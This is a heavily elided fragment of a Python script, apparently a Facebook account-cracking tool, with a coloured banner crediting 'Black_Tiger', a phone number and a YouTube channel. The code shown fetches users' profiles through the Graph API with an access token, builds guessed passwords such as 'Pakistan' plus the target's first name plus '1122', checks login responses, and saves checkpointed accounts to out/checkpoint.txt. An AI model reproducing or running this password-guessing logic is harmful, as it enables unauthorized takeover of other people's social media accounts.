...
\033[1;93m╭┳✪✪╤───────────────────✪✪➛➢
\033[1;92m•🎭▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅🎭
\033[1;94m[💈♚♚💈]Name:\033[1;92m Black_Tiger🎯      
\033[1;95m[💈♚♚💈]☏ →\033[1;93m    +923037335114🎃
\033[1;94m[💈♚♚💈]YT Channal   →      Time4 You🔱
...
def pilih_super():
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["error_msg"]:
															...
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 ='Pakistan'+ b['first_name'] + '1122'
	...
	print("\033[1;93m[💈] \033[1;95mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
